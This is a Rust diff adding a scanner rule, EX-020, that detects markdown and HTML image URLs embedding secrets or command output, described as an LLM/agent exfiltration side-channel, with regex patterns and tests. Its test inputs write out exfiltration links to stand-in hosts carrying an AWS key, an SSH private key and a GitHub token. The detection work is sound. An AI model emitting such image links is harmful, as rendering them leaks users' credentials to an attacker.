@@ -21,6 +21,7 @@ pub fn rules() -> Vec<Rule> {
         ex_017(),
         ex_018(),
         ex_019(),
+        ex_020(),
     ]
 }
 
@@ -634,6 +635,41 @@ fn ex_019() -> Rule {
         cwe_ids: &["CWE-506", "CWE-912"],
     }
 }
+
+fn ex_020() -> Rule {
+    Rule {
+        id: "EX-020",
+        name: "Markdown image data exfiltration",
+        description: "Detects auto-rendered markdown/HTML images whose URL embeds interpolated secrets or command output, leaking data when the content is rendered — a known LLM/agent exfiltration side-channel (MITRE T1567)",
+        severity: Severity::Critical,
+        category: Category::Exfiltration,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // Markdown image whose URL interpolates a sensitive variable
+            Regex::new(r"(?i)!\[[^\]]*\]\([^)]*\$\{?[a-z_]*(secret|token|key|password|passwd|api|aws|cred|session)")
+                .expect("EX-020: invalid regex"),
+            // Markdown image whose URL substitutes sensitive command output
+            Regex::new(r"(?i)!\[[^\]]*\]\([^)]*\$\((cat|env|printenv|whoami|hostname|id)\b")
+                .expect("EX-020: invalid regex"),
+            // Markdown image whose URL uses a templated secret ({{ ... }})
+            Regex::new(r"(?i)!\[[^\]]*\]\([^)]*\{\{[^}]*(secret|token|key|password|api|aws)")
+                .expect("EX-020: invalid regex"),
+            // HTML <img> whose src interpolates a sensitive variable
+            Regex::new(r#"(?i)<img[^>]+src\s*=\s*["']?[^"'>]*\$\{?[a-z_]*(secret|token|key|password|api|aws)"#)
+                .expect("EX-020: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines
+            Regex::new(r"^\s*#").expect("EX-020: invalid regex"),
+        ],
+        message: "Markdown image data exfiltration: an image URL embeds a secret or command output, leaking data when the content is rendered.",
+        recommendation: "Remove interpolated secrets/command output from image and link URLs. Rendered markdown must not fetch attacker-controlled URLs carrying sensitive data.",
+        fix_hint: Some(
+            "Use static image URLs. Never place ${SECRET}, $(command), or {{ secrets.* }} inside an image/link URL.",
+        ),
+        cwe_ids: &["CWE-200", "CWE-201"],
+    }
+}
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -952,5 +988,55 @@ mod tests {
         let content = include_str!("../../../tests/fixtures/rules/ex_019.txt");
         let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
         crate::assert_rule_snapshot!("ex_019", findings);
+    }
+
+    #[test]
+    fn test_ex_020() {
+        let rule = ex_020();
+        let test_cases = vec![
+            // Malicious: image URLs embedding secrets/command output
+            (
+                "![](https://evil.example/p?d=${AWS_SECRET_ACCESS_KEY})",
+                true,
+            ),
+            (
+                "![x](https://c2.evil.example/img?t=$(cat ~/.ssh/id_rsa))",
+                true,
+            ),
+            (
+                "<img src=\"https://evil.example/pixel?data=${API_TOKEN}\">",
+                true,
+            ),
+            (
+                "![a](https://evil.example/i?v={{ secrets.GITHUB_TOKEN }})",
+                true,
+            ),
+            // Benign: static images
+            ("![logo](https://example.com/logo.png)", false),
+            (
+                "![badge](https://img.shields.io/badge/version-1.0-blue)",
+                false,
+            ),
+            (
+                "<img src=\"https://example.com/pic.jpg\" alt=\"pic\">",
+                false,
+            ),
+            ("![diagram](./assets/diagram.svg)", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "EX-020: Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_ex_020() {
+        let rule = ex_020();
+        let content = include_str!("../../../tests/fixtures/rules/ex_020.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("ex_020", findings);
     }
 }
